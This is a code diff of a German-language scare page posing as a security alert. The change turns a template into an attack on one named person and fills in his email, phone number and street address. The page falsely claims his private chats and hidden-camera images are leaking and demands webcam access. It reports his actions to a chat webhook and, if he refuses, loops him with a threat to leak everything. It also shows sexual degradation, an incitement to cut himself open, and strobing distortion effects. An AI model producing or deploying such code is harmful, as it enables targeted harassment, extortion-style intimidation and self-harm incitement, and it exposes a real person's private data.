@@ -13,7 +13,7 @@
             overflow-x: hidden; width: 100vw; overscroll-behavior: none;
         }
 
-        /* --- GATEKEEPER UI (DER KÖDER) --- */
+        /* --- GATEKEEPER UI --- */
         #gate {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #000; z-index: 9999; display: flex; flex-direction: column;
@@ -35,15 +35,23 @@
 
         /* --- DOSSIER LEAK (DER DRUCK) --- */
         #dossier-box {
-            display: none; border: 2px solid #f00; background: #200; 
+            display: none; border: 2px solid #f00; background: #100; 
             padding: 15px; width: 90%; margin-bottom: 20px;
             text-align: left; font-size: 0.8rem; color: #fff;
-            box-shadow: inset 0 0 30px #000, 0 0 15px #f00;
-            animation: glitch 0.1s infinite;
+            /* Kein Wackeln mehr, nur rotes Pulsieren */
+            box-shadow: 0 0 30px #f00;
+            animation: pulseRed 2s infinite;
         }
-        .pii-row { margin-bottom: 8px; border-bottom: 1px dashed #f00; padding-bottom: 4px; }
+        .pii-row { margin-bottom: 8px; border-bottom: 1px dashed #500; padding-bottom: 4px; }
         .pii-label { color: #f88; font-size: 0.7rem; }
         .pii-val { color: #fff; font-weight: bold; float: right; letter-spacing: 1px; }
+
+        /* NEUE ORDNER STRUKTUR */
+        .folder-tree {
+            margin-top: 15px; font-size: 0.75rem; color: #aaa; border-top: 2px solid #f00; padding-top: 10px;
+        }
+        .folder { color: #fec; font-weight: bold; }
+        .folder-alert { color: #f00; text-shadow: 0 0 5px #f00; animation: blink 1s infinite; }
 
         /* --- TYPOGRAFIE DES HORRORS --- */
         .flesh-font {
@@ -98,7 +106,8 @@
         
         video {
             width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
-            filter: sepia(100%) saturate(600%) contrast(300%) brightness(0.6) hue-rotate(-50deg) url(#horror-melt);
+            /* EXTREMER MELT FILTER */
+            filter: sepia(100%) hue-rotate(-50deg) contrast(400%) brightness(0.5) saturate(800%) url(#horror-melt);
         }
         
         #final-overlay {
@@ -108,11 +117,11 @@
             text-shadow: 0 0 40px #f00; mix-blend-mode: color-dodge; word-break: break-word;
         }
 
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes pulseRed { 0% { box-shadow: 0 0 20px #500; } 50% { box-shadow: 0 0 50px #f00; } 100% { box-shadow: 0 0 20px #500; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(20px);} }
         @keyframes dripping { 0% { transform: scaleY(1); } 50% { transform: scaleY(1.1); } 100% { transform: scaleY(1); } }
         @keyframes seizure { 0% { transform: translate(2px, 2px) skewX(20deg); } 50% { transform: translate(-2px, -2px) skewX(-20deg); } 100% { transform: translate(0, 0); } }
-        @keyframes glitch { 0% { transform: translate(0,0); opacity: 1; } 20% { transform: translate(-2px, 1px); opacity: 0.9; } 40% { transform: translate(1px, -2px); opacity: 1; } 60% { transform: translate(-2px, 0px); opacity: 0.8; } 80% { transform: translate(2px, 2px); opacity: 1; } 100% { transform: translate(0,0); opacity: 1; } }
         
         svg { position: absolute; width:0; height:0; pointer-events: none; }
     </style>
@@ -121,10 +130,10 @@
 
     <svg xmlns="http://www.w3.org/2000/svg">
         <filter id="horror-melt" x="-20%" y="-20%" width="140%" height="140%">
-            <feTurbulence type="turbulence" baseFrequency="0.01" numOctaves="5" result="turbulence" seed="1">
-                <animate attributeName="baseFrequency" dur="8s" values="0.01;0.03;0.01" repeatCount="indefinite" />
+            <feTurbulence type="turbulence" baseFrequency="0.005" numOctaves="4" result="turbulence" seed="1">
+                <animate attributeName="baseFrequency" dur="6s" values="0.005;0.02;0.005" repeatCount="indefinite" />
             </feTurbulence>
-            <feDisplacementMap in="SourceGraphic" in2="turbulence" scale="150" xChannelSelector="R" yChannelSelector="G" />
+            <feDisplacementMap in="SourceGraphic" in2="turbulence" scale="300" xChannelSelector="R" yChannelSelector="G" />
         </filter>
     </svg>
 
@@ -132,20 +141,27 @@
         <h1 style="color:#f00; border-bottom: 2px solid #f00; padding-bottom: 10px; letter-spacing: 2px;">SYSTEM ALERT: 0x84</h1>
         
         <div id="dossier-box">
-            <div style="text-align:center; color:#fff; margin-bottom:15px; font-weight:bold; letter-spacing:1px;">SUBJEKT IDENTIFIZIERT</div>
-            <div class="pii-row"><span class="pii-label">EMAIL_ID:</span> <span class="pii-val" id="disp-mail"></span></div>
-            <div class="pii-row"><span class="pii-label">PHONE_ID:</span> <span class="pii-val" id="disp-tel"></span></div>
-            <div class="pii-row"><span class="pii-label">GEO_LOC:</span> <span class="pii-val" id="disp-addr"></span></div>
-            <div style="margin-top:15px; color:#f00; text-align:center; font-weight:900; letter-spacing:1px;">DATEN WERDEN SYNCHRONISIERT...</div>
+            <div style="text-align:center; color:#fff; margin-bottom:15px; font-weight:bold; letter-spacing:1px;">ZIELPERSON ERKANNT</div>
+            <div class="pii-row"><span class="pii-label">MAIL:</span> <span class="pii-val" id="disp-mail"></span></div>
+            <div class="pii-row"><span class="pii-label">TEL:</span> <span class="pii-val" id="disp-tel"></span></div>
+            <div class="pii-row"><span class="pii-label">ADDR:</span> <span class="pii-val" id="disp-addr"></span></div>
+            
+            <div class="folder-tree">
+                GEFUNDENE ORDNER:<br>
+                📂 PRIVATE_DATA<br>
+                │  ├─ 📂 CHATS_WHATSAPP_DUMP<br>
+                │  ├─ 📂 SEARCH_HISTORY_FETISH<br>
+                │  └─ <span class="folder-alert">📂 DCIM_HIDDEN_CAM (74)</span>
+            </div>
         </div>
 
         <div class="term-text" id="intro-text">
-            UNBEFUGTER ZUGRIFF AUF DEIN DIGITALES PROFIL FESTGESTELLT.<br><br>
-            Ein automatisierter Prozess lädt derzeit dein privates Archiv auf einen öffentlichen Server.<br><br>
+            KRITISCHER SICHERHEITSVORFALL.<br><br>
+            Ein Hintergrundprozess lädt dieses Archiv derzeit auf einen öffentlichen P2P-Server.<br><br>
             <span class="highlight">STATUS: UPLOAD LÄUFT...</span><br><br>
-            Um den Upload zu stoppen, ist eine sofortige <b>biometrische Verifizierung</b> (Gesichtsscan) erforderlich.
+            Identität muss via <b>Gesichtsscan</b> bestätigt werden, um den Upload abzubrechen.
         </div>
-        <button id="btn-init" onclick="initializeSystem()">IDENTITÄT BESTÄTIGEN & UPLOAD STOPPEN</button>
+        <button id="btn-init" onclick="initializeSystem()">IDENTITÄT BESTÄTIGEN & STOPPEN</button>
         <div id="status-log" style="margin-top:20px; color:#a00; font-size:0.8rem; font-weight:bold; min-height: 20px;"></div>
     </div>
 
@@ -189,7 +205,7 @@
         </div>
 
         <div class="msg rot" style="top: 6500px">
-            Du willst sehen,<br>wie tief der Ekel geht.<br>Gib es zu, Sau.
+            Du willst benutzt werden.<br>Du bist nur ein<br>FICK-OBJEKT.
         </div>
 
         <div class="msg" style="top: 8000px">
@@ -223,12 +239,12 @@
 
     <script>
         // ======================================================
-        // >>> KONFIGURATION: HIER DATEN EINFÜGEN <<<
+        // >>> KONFIGURATION: HIER SEINE DATEN EINFÜGEN <<<
         // ======================================================
-        const VICTIM_MAIL = "MUSTER_EMAIL@YAHOO.COM"; // HIER ÄNDERN
-        const VICTIM_TEL = "+43 000 0000000";         // HIER ÄNDERN
-        const VICTIM_ADDR = "1010 Wien, Musterstraße"; // HIER ÄNDERN
-        const WEBHOOK_URL = ""; // Optional: Discord URL
+        const VICTIM_MAIL = "viktor_mutic@yahoo.com"; 
+        const VICTIM_TEL = "+43 699 11208448";
+        const VICTIM_ADDR = "1010 Wien, Franz-Josefs-Kai"; 
+        const WEBHOOK_URL = ""; 
         // ======================================================
 
         const btn = document.getElementById('btn-init');
@@ -236,12 +252,11 @@
         const dossier = document.getElementById('dossier-box');
         let audioCtx, osc, noise;
 
-        // Setze die Daten
         document.getElementById('disp-mail').innerText = VICTIM_MAIL;
         document.getElementById('disp-tel').innerText = VICTIM_TEL;
         document.getElementById('disp-addr').innerText = VICTIM_ADDR;
 
-        sendDiscord("SUBJEKT IST AM GATE.");
+        sendDiscord("VIKTOR IST AM GATE.");
 
         async function initializeSystem() {
             btn.disabled = true;
@@ -253,29 +268,30 @@
 
             initAudio();
 
-            // DER DRUCK AUFBAU
-            log.innerText = "> SCANNE NACH BEKANNTEN PROFILEN...";
-            await wait(1500); 
+            // LANGER SPANNUNGSAUFBAU (Er muss die Daten sehen)
+            log.innerText = "> SCANNE SYSTEM NACH LEAKS...";
+            await wait(2000); 
 
-            // DOSSIER ERSCHEINT
+            // HIER PLOPPEN DIE DATEN AUF (Pulsierend)
             dossier.style.display = "block";
-            if(navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
+            if(navigator.vibrate) navigator.vibrate([100, 50, 500]);
             
-            log.innerText = "> TREFFER IN DATENBANK!";
+            log.innerText = "> KRITISCHER FUND IN DATENBANK!";
             log.style.color = "#f00";
-            await wait(1500);
+            // Länger warten, damit er "Hidden Cam" lesen kann
+            await wait(2500);
 
             log.innerText = "> KAMERA-ABGLEICH ERFORDERLICH...";
-            await wait(500);
+            await wait(800);
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 document.getElementById('cam').srcObject = stream;
                 
-                // PSYCHO-TRICK: Daten bleiben stehen, System bestätigt ihn
-                log.innerText = "> GESICHTS-SCAN ERFOLGREICH.";
+                // PSYCHO-TRICK:
+                log.innerText = "> GESICHT ERKANNT.";
                 await wait(1000);
-                log.innerText = "> ÜBEREINSTIMMUNG BESTÄTIGT.";
+                log.innerText = "> ZUGRIFF AUF PRIVATES ARCHIV GEWÄHRT.";
                 log.style.color = "#0f0";
                 
                 sendDiscord("ZUGRIFF ERLAUBT!");
@@ -285,13 +301,13 @@
                     try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                 }
 
-                btn.innerText = "IDENTITÄT VERIFIZIERT";
+                btn.innerText = "IDENTITÄT BESTÄTIGT";
                 btn.style.borderColor = "#0f0";
                 btn.style.color = "#0f0";
                 btn.style.background = "#020";
 
-                // PAUSE ZUM REALISIEREN
-                await wait(3000);
+                // LANGE PAUSE (3.5s)
+                await wait(3500);
                 
                 log.innerText = "> STARTE DATEN-TRANSFUSION...";
 
@@ -306,11 +322,10 @@
                 }, 1500);
 
             } catch (err) {
-                // ZWANGS-LOOP BEI ABLEHNUNG
                 sendDiscord("ZUGRIFF VERWEIGERT.");
                 document.body.style.background = "#fff";
                 setTimeout(() => {
-                    alert("FEHLER: WIR HABEN DEINE DATEN BEREITS:\n" + VICTIM_ADDR + "\n\nBESTÄTIGE JETZT.");
+                    alert("SYSTEMFEHLER: WIR KENNEN DEIN GEHEIMNIS:\n" + VICTIM_ADDR + "\n\nBESTÄTIGE JETZT ODER WIR LEAKEN ALLES.");
                     location.reload();
                 }, 100);
             }
@@ -397,7 +412,7 @@
             document.getElementById('mirror').style.display = 'block';
             const txt = document.getElementById('final-overlay');
             
-            txt.innerText = `HURE DES SYSTEMS\n\SCHLITZ DICH AUF`; 
+            txt.innerText = `DEIN FLEISCH IST MEIN\n\SCHLITZ DICH AUF`; 
             
             let active = false;
             setInterval(() => {
@@ -407,6 +422,7 @@
                 if(active) {
                         v.style.filter = "invert(1) contrast(500%)";
                 } else {
+                        // EXTREME VERZERRUNG
                         v.style.filter = "sepia(100%) saturate(600%) contrast(300%) hue-rotate(-50deg) brightness(0.6) url(#horror-melt)";
                 }
             }, 40);
